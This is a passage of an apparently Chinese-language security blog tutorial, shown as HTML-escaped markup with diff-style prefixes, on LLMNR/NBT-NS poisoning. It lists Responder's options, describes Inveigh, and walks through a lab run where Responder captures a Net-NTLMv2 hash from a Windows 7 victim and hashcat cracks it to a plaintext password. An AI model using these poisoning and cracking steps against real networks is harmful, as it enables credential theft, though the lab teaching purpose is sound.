-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Local IP to use (only for OSX)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Poison all requests with another IPv6 address than
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Responder&amp;#39;s one.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-e 10.0.0.22, --externalip=10.0.0.22
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Poison all requests with another IP address than
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Responder&amp;#39;s one.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-b, --basic           Return a Basic HTTP authentication. Default: NTLM
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-d, --DHCP            Enable answers for DHCP broadcast requests. This
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    option will inject a WPAD server in the DHCP response.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Default: False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-D, --DHCP-DNS        This option will inject a DNS server in the DHCP
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    response, otherwise a WPAD server will be added.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Default: False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-w, --wpad            Start the WPAD rogue proxy server. Default value is
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Upstream HTTP proxy used by the rogue WPAD Proxy for
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    outgoing requests (format: host:port)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    retrieval. This may cause a login prompt. Default:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    authentication for the proxy. WPAD doesn&amp;#39;t need to be
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    ON. This option is highly effective when combined with
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    -r. Default: False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--lm                  Force LM hashing downgrade for Windows XP/2003 and
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    earlier. Default: False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--disable-ess         Force ESS downgrade. Default: False
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v, --verbose         Increase verbosity.
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;inveigh&#34;&gt;Inveigh&lt;/h2&gt;
-&lt;p&gt;IInveigh 通过数据包嗅探和协议特定的 isteners/sockets 进行欺骗攻击和哈希/凭证捕获。作为该工具原始 Powershell 版本的基础的数据包嗅探方法具有以下优点：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;通过 Window 的 SMB 服务捕获 SMB NTLM 质询/响应&lt;/li&gt;
-&lt;li&gt;主机系统上更少的可见端口绑定&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;主要缺点是需要提升访问权限。&lt;/p&gt;
-&lt;p&gt;在当前版本的 Windows 上，默认运行的 UDP 服务允许端口重用。因此，数据包嗅探不再为绕过正在使用的 UDP 端口提供优势。Inveigh 的 UDP 侦听器都配置为利用端口重用。&lt;/p&gt;
-&lt;p&gt;下载地址：https://github.com/Kevin-Robertson/Inveigh.git&lt;/p&gt;
-&lt;h1 id=&#34;0x03-攻击实战&#34;&gt;0x03 攻击实战&lt;/h1&gt;
-&lt;h2 id=&#34;捕获net-ntlmv2&#34;&gt;捕获Net-NTLMv2&lt;/h2&gt;
-&lt;h3 id=&#34;主要的工作流程&#34;&gt;主要的工作流程&lt;/h3&gt;
-&lt;p&gt;如下图所示，受害者在网络中寻找filesrvr这个主机(因为少打了一个e)，先去询问DNS服务器，如果不知道就会去内网中广播谁是filesrvr，攻击者就会设置一个监听，假装回应说他就是filesrvr，中间就会发出获取hash信号，当攻击者收到后机会返回错误的信息给受害者：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;实战&#34;&gt;实战&lt;/h3&gt;
-&lt;p&gt;实战我们是使用一台受害者Windows 7(172.16.0.105)，一台攻击者Kali Linux (172.16.0.107)，Responder工具是kali自带的，所以直接在kali执行responder即可。&lt;/p&gt;
-&lt;p&gt;在Kali上面执行以下命令，记得是以sudo方式执行,f是指获取指纹，v是详情：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr/share/responder&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ sudo responder -I eth0 -fv                                                                                                                                                                                                                                                              
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         __
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  .----.-----.-----.-----.-----.-----.--&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.-----.----.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__ --&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   __&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           NBT-NS, LLMNR &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; MDNS Responder 3.0.7.0
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Author: Laurent Gaffie &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;laurent.gaffie@gmail.com&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  To &lt;span class=&#34;nb&#34;&gt;kill&lt;/span&gt; this script hit CTRL-C
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoners:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LLMNR                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NBT-NS                     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS/MDNS                   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DHCP                       &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Servers:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTPS server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WPAD proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Auth proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMB server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Kerberos server            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SQL server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    FTP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    IMAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    POP3 server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LDAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    RDP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DCE-RPC server             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WinRM server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; HTTP Options:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Always serving EXE         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving EXE                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving HTML               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Upstream Proxy             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoning Options:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Analyze Mode               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force WPAD auth            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force Basic Auth           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force LM downgrade         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force ESS downgrade        &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Fingerprint hosts          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Generic Options:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder NIC              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;eth0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder IP               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.107&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Challenge &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t Respond To Names     [&amp;#39;&lt;/span&gt;ISATAP&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Current Session Variables:
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Machine Name     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WIN-OVB356BIVFL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Domain Name      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OATW.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder DCE-RPC Port     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;45303&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; events...
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后我们在Windows 7中使用Win+r打开运行窗口，随便输入一个错误的主机名称：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们再回来已经能看到获取到了Net-NTLMv2：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;关于Net-NTLMv2和LM的区别可以看文章&lt;a href=&#34;https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4&#34;&gt;LM, NTLM, Net-NTLMv2&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;我们可以使用kali自带的John活着hashcat工具进行破解,我们把下面一段保存为hash.txt:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc92n::WIN-JH8N3KV3OQ0:75ca7c174829730d:7C8437661030E0EB8D762DCFC77CBE65:0101000000000000000C19E89C21D801B8B5060ABB05AFE600000000020008004400350033004A0001001E00570049004E002D004E004B0048004A00480050005600460045005000490004003400570049004E002D004E004B0048004A0048005000560046004500500049002E004400350033004A002E004C004F00430041004C00030014004400350033004A002E004C004F00430041004C00050014004400350033004A002E004C004F00430041004C0007000800000C19E89C21D80106000400020000000800300030000000000000000100000000200000C1802F43EEA3DDC3521CCF236AAF808F1A6C31366979710880AC8CED8547228D0A001000000000000000000000000000000000000900140063006900660073002F0078007800780061006100000000000000000000000000
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后我们使用hashcat进行破解：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ hashcat -m &lt;span class=&#34;m&#34;&gt;5600&lt;/span&gt; hash.txt passwd.txt                                                                                                                                                                                                                                                 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c8437661030e0eb8d762dcfc77cbe65:0101000000000000000c19e89c21d801b8b5060abb05afe600000000020008004400350033004a0001001e00570049004e002d004e004b0048004a00480050005600460045005000490004003400570049004e002d004e004b0048004a0048005000560046004500500049002e004400350033004a002e004c004f00430041004c00030014004400350033004a002e004c004f00430041004c00050014004400350033004a002e004c004f00430041004c0007000800000c19e89c21d80106000400020000000800300030000000000000000100000000200000c1802f43eea3ddc3521ccf236aaf808f1a6c31366979710880ac8ced8547228d0a001000000000000000000000000000000000000900140063006900660073002f0078007800780061006100000000000000000000000000:p@ssw0rd
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Session..........: hashcat
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Status...........: Cracked
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hash.Name........: NetNTLMv2
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hash.Target......: SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c843766103...000000
